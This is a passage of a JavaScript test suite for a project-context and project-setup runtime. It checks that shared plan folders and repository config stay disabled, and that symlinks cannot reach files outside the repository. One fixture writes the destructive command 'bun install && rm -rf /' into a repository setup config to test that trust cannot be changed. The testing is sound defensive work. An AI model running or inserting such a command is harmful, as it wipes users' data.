      await expect(context.sharePlan(projectId, 'shared:sentinel.md')).rejects.toThrow('shared plans folder is required');
      await expect(readFile(context.contextPathFor(projectId), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      expect(await readdir(outside)).toEqual(['sentinel.md']);
      expect(await readFile(path.join(outside, 'sentinel.md'), 'utf8')).toBe('# Outside\n\nUntouched');
    } finally {
      await cleanup();
    }
  });

  it.each(['default', 'configured', 'default-ancestor-link', 'configured-ancestor-link', 'leaf-link', 'dangling-link'])(
    'refuses shared operations without data effects for %s, while personal CRUD works',
    async (layout) => {
      const { runtime: config, tempRoot, cleanup } = await createRuntime();
      try {
        const repo = path.join(tempRoot, 'repo');
        const outside = path.join(tempRoot, 'outside');
        const outsideRaw = '# Outside sentinel\n\nDo not disclose, overwrite or move.\n';
        const outsideFile = path.join(outside, 'sentinel.md');
        await mkdir(outside, { recursive: true });
        await writeFile(outsideFile, outsideRaw);
        await mkdir(path.join(repo, '.openchamber'), { recursive: true });
        const configured = layout.startsWith('configured');
        const relative = configured ? 'docs/plans' : '.openchamber/plans';
        const sharedDir = path.join(repo, relative);
        const sharedConfigPath = path.join(repo, '.openchamber', 'project.json');
        const sharedConfig = JSON.stringify(configured ? { version: 1, plansDir: relative } : { version: 1 });
        await writeFile(sharedConfigPath, sharedConfig);
        if (layout === 'configured-ancestor-link') {
          await mkdir(path.join(outside, 'plans'));
          await writeFile(path.join(outside, 'plans', 'sentinel.md'), outsideRaw);
          await symlink(outside, path.join(repo, 'docs'));
        } else if (layout === 'default-ancestor-link') {
          await symlink(outside, sharedDir);
        } else if (layout === 'dangling-link') {
          await symlink(path.join(outside, 'absent'), sharedDir);
        } else {
          await mkdir(sharedDir, { recursive: true });
          if (layout === 'leaf-link') await symlink(outsideFile, path.join(sharedDir, 'sentinel.md'));
          else await writeFile(path.join(sharedDir, 'sentinel.md'), '# Repository plan\n\nUntouched.\n');
        }
        const projectId = createProjectIdFromPath(repo);
        const projectsDirPath = path.join(tempRoot, 'projects');
        const context = createProjectContextRuntime({
          fsPromises: await import('fs/promises'), path, projectsDirPath,
          resolveSharedPlansDir: (id) => config.resolveSharedPlansDir(id),
        });
        const contextPath = context.contextPathFor(projectId);
        await mkdir(path.dirname(contextPath), { recursive: true });
        const sharedLink = { id: 'moved-plan', file: 'sentinel.md', title: 'Moved', createdAt: 1, shared: true };
        await writeFile(contextPath, JSON.stringify({ version: 2, notes: [], todos: [], plans: [sharedLink] }));
        const personal = await context.createPlan(projectId, { title: 'Personal', body: 'Own content' });
        const personalId = personal.plan.id;
        const before = await readFile(contextPath, 'utf8');
        const sharedFile = path.join(sharedDir, 'sentinel.md');
        const sharedBefore = layout === 'dangling-link' ? null : await readFile(sharedFile, 'utf8');
        const outsideEntries = await readdir(outside);

        expect(await config.resolveSharedPlansDir(projectId)).toBeNull();
        const listed = await context.readContext(projectId);
        expect(listed.sharedPlansDir).toBeNull();
        expect(listed.plans.map((plan) => plan.id)).toEqual([personalId]);
        expect(JSON.stringify(listed)).not.toContain('Outside sentinel');
        for (const planId of ['shared:sentinel.md', 'moved-plan']) {
          expect(await context.readPlan(projectId, planId)).toBeNull();
          expect(await context.updatePlan(projectId, planId, { raw: '# Overwritten' })).toBeNull();
          expect(await context.setPlanPinned(projectId, planId, true)).toBeNull();
          expect((await context.deletePlan(projectId, planId)).deleted).toBe(false);
          expect(await context.unsharePlan(projectId, planId)).toBeNull();
          await expect(context.sharePlan(projectId, planId)).rejects.toThrow('shared plans folder is required');
          expect(await readFile(contextPath, 'utf8')).toBe(before);
        }
        const app = express();
        registerProjectContextRoutes(app, { projectContextRuntime: context });
        for (const planId of ['shared:sentinel.md', 'moved-plan']) {
          const endpoint = `/api/project-context/${projectId}/plans/${encodeURIComponent(planId)}`;
          expect((await request(app).get(endpoint)).status).toBe(404);
          expect((await request(app).put(endpoint).send({ raw: '# Overwritten' })).status).toBe(404);
          expect((await request(app).patch(endpoint).send({ pinned: true })).status).toBe(404);
          expect((await request(app).delete(endpoint)).status).toBe(404);
          expect((await request(app).post(`${endpoint}/unshare`)).status).toBe(404);
          expect((await request(app).post(`${endpoint}/share`)).status).toBe(400);
        }
        await expect(context.sharePlan(projectId, personalId)).rejects.toThrow('shared plans folder is required');
        expect(await readFile(contextPath, 'utf8')).toBe(before);
        expect(await readFile(outsideFile, 'utf8')).toBe(outsideRaw);
        expect(await readdir(outside)).toEqual(outsideEntries);
        expect(await readFile(sharedConfigPath, 'utf8')).toBe(sharedConfig);
        if (sharedBefore !== null) expect(await readFile(sharedFile, 'utf8')).toBe(sharedBefore);
        else await expect(readFile(sharedFile, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
        expect(await readdir(context.plansDirFor(projectId))).toEqual([personal.plan.file]);

        expect((await context.readPlan(projectId, personalId)).body).toBe('Own content');
        expect((await context.updatePlan(projectId, personalId, { raw: '# Edited\n\nStill personal.\n' })).raw).toBe('# Edited\n\nStill personal.\n');
        expect((await context.setPlanPinned(projectId, personalId, true)).plan.pinned).toBe(true);
        const note = await context.createNote(projectId, { body: 'Keep notes' });
        await context.saveTodos(projectId, [{ id: 'todo', text: 'Keep todos', completed: false, createdAt: 1 }]);
        expect((await context.deletePlan(projectId, personalId)).deleted).toBe(true);
        expect(await context.readPlan(projectId, personalId)).toBeNull();
        const retained = JSON.parse(await readFile(contextPath, 'utf8'));
        expect(retained.plans).toEqual([{ ...sharedLink, pinned: false }]);
        expect(retained.notes[0].id).toBe(note.note.id);
        expect(retained.todos[0].text).toBe('Keep todos');
        expect(await readFile(outsideFile, 'utf8')).toBe(outsideRaw);
      } finally {
        await cleanup();
      }
    },
  );
});

describe('project setup runtime', () => {
  it('reads an empty merged view for a project without files', async () => {
    const { runtime, cleanup } = await createRuntime();
    try {
      const view = await runtime.readProjectSetup('project-a');
      expect(view.setupWorktree).toEqual([]);
      expect(view.setupWorktreeWait).toBe(false);
      expect(view.projectActions).toEqual([]);
      expect(view.draftStarters).toEqual([]);
      expect(view.shared.status).toBe('invalid');
      expect(view.shared.reason).toBe('shared-project-config-disabled');
      expect(view.personal).toEqual(emptyPersonal);
    } finally {
      await cleanup();
    }
  });

  it('round-trips a patch and preserves server-owned and unknown keys', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      await mkdir(path.join(tempRoot, 'projects'), { recursive: true });
      await writeFile(path.join(tempRoot, 'projects', 'project-a.json'), JSON.stringify({
        version: 1,
        scheduledTasks: [{ id: 'task', name: 'Keep me' }],
        futureKey: { from: 'a newer build' },
        'setup-worktree': ['old'],
      }));

      const view = await runtime.updateProjectSetup('project-a', {
        setupWorktree: ['bun install', ''],
        setupWorktreeWait: true,
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }],
        projectActionsPrimaryId: 'dev',
        projectPath: '/repo/a',
      });
      expect(view.setupWorktree).toEqual(['bun install']);
      expect(view.setupWorktreeWait).toBe(true);
      expect(view.projectActions).toEqual([{ id: 'dev', name: 'Dev', command: 'bun run dev', icon: null, source: 'personal' }]);
      expect(view.projectActionsPrimaryId).toBe('dev');

      const raw = await readRaw('project-a');
      expect(raw.scheduledTasks).toEqual([{ id: 'task', name: 'Keep me' }]);
      expect(raw.futureKey).toEqual({ from: 'a newer build' });
      expect(raw['setup-worktree']).toEqual(['bun install']);
      expect(raw['setup-worktree-wait']).toBe(true);
      expect(raw.projectPath).toBe('/repo/a');
      expect(await runtime.readProjectSetup('project-a')).toEqual(view);
    } finally {
      await cleanup();
    }
  });

  it('clears the primary action id when the patch sets it to null', async () => {
    const { runtime, readRaw, cleanup } = await createRuntime();
    try {
      await runtime.updateProjectSetup('project-a', {
        projectActions: [{ id: 'dev', name: 'Dev', command: 'x' }],
        projectActionsPrimaryId: 'dev',
      });
      await runtime.updateProjectSetup('project-a', { projectActionsPrimaryId: null });
      expect(await readRaw('project-a')).not.toHaveProperty('projectActionsPrimaryId');
      expect((await runtime.readProjectSetup('project-a')).projectActionsPrimaryId).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('leaves the file alone when the patch is invalid', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      await expect(runtime.updateProjectSetup('project-a', { setupWorktree: 'nope' })).rejects.toThrow('setupWorktree must be');
      await expect(readFile(path.join(tempRoot, 'projects', 'project-a.json'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
    } finally {
      await cleanup();
    }
  });

  it('does not clobber a scheduled task written between read and write', async () => {
    const { runtime, readRaw, cleanup } = await createRuntime();
    try {
      await runtime.upsertScheduledTask('project-a', {
        name: 'Nightly',
        enabled: true,
        schedule: { kind: 'daily', time: '09:30', timezone: 'UTC' },
        execution: { prompt: 'hi', providerID: 'openai', modelID: 'gpt' },
      });
      await Promise.all([
        runtime.updateProjectSetup('project-a', { setupWorktree: ['bun install'] }),
        runtime.updateProjectSetup('project-a', { draftStarters: [{ type: 'skill', name: 's' }] }),
      ]);
      const raw = await readRaw('project-a');
      expect(raw.scheduledTasks).toHaveLength(1);
      expect(raw['setup-worktree']).toEqual(['bun install']);
      expect(raw.draftStarters).toEqual([{ type: 'skill', name: 's' }]);
    } finally {
      await cleanup();
    }
  });

  it('ignores repository config while personal commands, actions and explicit trust storage still work', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({
        version: 1,
        setupWorktree: ['bun install'],
        projectActions: [{ id: 'dev', name: 'Dev', command: 'bun run dev' }, { id: 'lint', name: 'Lint', command: 'bun lint' }],
        draftStarters: [{ type: 'skill', name: 'triage' }],
        plansDir: 'docs/plans',
      }));
      const projectId = createProjectIdFromPath(repo);

      const fresh = await runtime.readProjectSetup(projectId);
      expect(fresh.shared.status).toBe('invalid');
      expect(fresh.shared.reason).toBe('shared-project-config-disabled');
      expect(fresh.shared.plansDir).toBeNull();
      expect(fresh.setupWorktree).toEqual([]);
      expect(fresh.projectActions).toEqual([]);

      const view = await runtime.updateProjectSetup(projectId, {
        setupWorktree: ['cp .env.example .env'],
        hiddenSharedActionIds: ['lint'],
        projectActions: [{ id: 'mine', name: 'Mine', command: 'x' }],
      });
      expect(view.setupWorktree).toEqual(['cp .env.example .env']);
      expect(view.projectActions.map((action) => `${action.id}:${action.source}`)).toEqual(['mine:personal']);
      expect(view.draftStarters).toEqual([]);
      expect(view.personal.hiddenSharedActionIds).toEqual(['lint']);

      expect(view.trust).toEqual({ hash: null, trusted: true });
      const trusted = await runtime.updateProjectSetup(projectId, { sharedTrustHash: 'sha256:explicit-personal-write' });
      expect(trusted.personal.sharedTrust?.hash).toBe('sha256:explicit-personal-write');
      // Repository changes cannot enable discovery or mutate stored approval.
      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({ version: 1, setupWorktree: ['bun install && rm -rf /'] }));
      expect((await runtime.readProjectSetup(projectId)).personal.sharedTrust).toEqual(trusted.personal.sharedTrust);
      const reset = await runtime.updateProjectSetup(projectId, { sharedTrustHash: null });
      expect(reset.personal.sharedTrust).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('refuses normal shared metadata and empty removal while preserving shared files and personal approval', async () => {
    const { runtime, tempRoot, readRaw, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      const sharedPath = path.join(repo, '.openchamber', 'project.json');
      await mkdir(path.dirname(sharedPath), { recursive: true });
      const bytes = '{ "version": 1, "setupWorktree": ["bun install"], "plansDir": "docs/plans" }\n';
      await writeFile(sharedPath, bytes);
      const projectId = createProjectIdFromPath(repo);
      const shared = await runtime.readProjectSetup(projectId);
      expect(shared.shared.status).toBe('invalid');
      expect(shared.shared.reason).toBe('shared-project-config-disabled');
      const approved = await runtime.updateProjectSetup(projectId, { sharedTrustHash: 'sha256:explicit-personal-write' });
      expect(approved.trust.trusted).toBe(true);
      const personalBefore = await readRaw(projectId);
      for (const patch of [{ plansDir: 'new/plans' }, { setupWorktree: [], projectActions: [], plansDir: null }, {}]) {
        await expect(runtime.updateSharedProjectSetup(projectId, patch)).rejects.toThrow('shared-project-config-writes-disabled');
        expect(await readFile(sharedPath, 'utf8')).toBe(bytes);
        expect(await readdir(path.dirname(sharedPath))).toEqual(['project.json']);
        expect(await readRaw(projectId)).toEqual(personalBefore);
        expect((await runtime.readProjectSetup(projectId)).trust.trusted).toBe(true);
      }
    } finally {
      await cleanup();
    }
  });

  it('refuses to write the shared file for a checkout that does not exist and on a bad patch', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const projectId = createProjectIdFromPath(path.join(tempRoot, 'missing-repo'));
      await expect(runtime.updateSharedProjectSetup(projectId, { setupWorktree: ['x'] })).rejects.toThrow('shared-project-config-writes-disabled');
      await expect(runtime.updateSharedProjectSetup('project-test', { setupWorktree: ['x'] })).rejects.toThrow('shared-project-config-writes-disabled');
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      await expect(runtime.updateSharedProjectSetup(createProjectIdFromPath(repo), { plansDir: '../x' })).rejects.toThrow('shared-project-config-writes-disabled');
      await expect(readFile(path.join(repo, '.openchamber', 'project.json'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
    } finally {
      await cleanup();
    }
  });

  it('hard-disables repository plans even for valid default and configured folders', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(repo, { recursive: true });
      const projectId = createProjectIdFromPath(repo);
      expect(await runtime.resolveSharedPlansDir(projectId)).toBeNull();
      await mkdir(path.join(repo, '.openchamber'));
      await writeFile(path.join(repo, '.openchamber', 'project.json'), JSON.stringify({ version: 1, plansDir: 'docs/plans' }));
      expect(await runtime.resolveSharedPlansDir(projectId)).toBeNull();
      expect(await runtime.resolveSharedPlansDir('project-test')).toBeNull();
    } finally {
      await cleanup();
    }
  });

  it('resolves no shared folder before reading even malformed personal or repository metadata', async () => {
    const { tempRoot, cleanup } = await createRuntime();
    try {
      let reads = 0;
      const runtime = createProjectConfigRuntime({
        fsPromises: {
          ...(await import('fs/promises')),
          readFile: async () => { reads += 1; throw new Error('metadata must not be read'); },
        },
        path,
        projectsDirPath: path.join(tempRoot, 'projects'),
      });
      expect(await runtime.resolveSharedPlansDir(createProjectIdFromPath(path.join(tempRoot, 'repo')))).toBeNull();
      expect(await runtime.resolveSharedPlansDir('project-test')).toBeNull();
      expect(reads).toBe(0);
    } finally {
      await cleanup();
    }
  });

  it('reports shared config disabled even for malformed files and still serves the personal setup', async () => {
    const { runtime, tempRoot, cleanup } = await createRuntime();
    try {
      const repo = path.join(tempRoot, 'repo');
      await mkdir(path.join(repo, '.openchamber'), { recursive: true });
      await writeFile(path.join(repo, '.openchamber', 'project.json'), '{ broken');
      const projectId = createProjectIdFromPath(repo);
      await runtime.updateProjectSetup(projectId, { setupWorktree: ['mine'] });

      const view = await runtime.readProjectSetup(projectId);
      expect(view.shared.status).toBe('invalid');
      expect(view.shared.reason).toBe('shared-project-config-disabled');
      expect(view.setupWorktree).toEqual(['mine']);
    } finally {
      await cleanup();
    }
  });
});
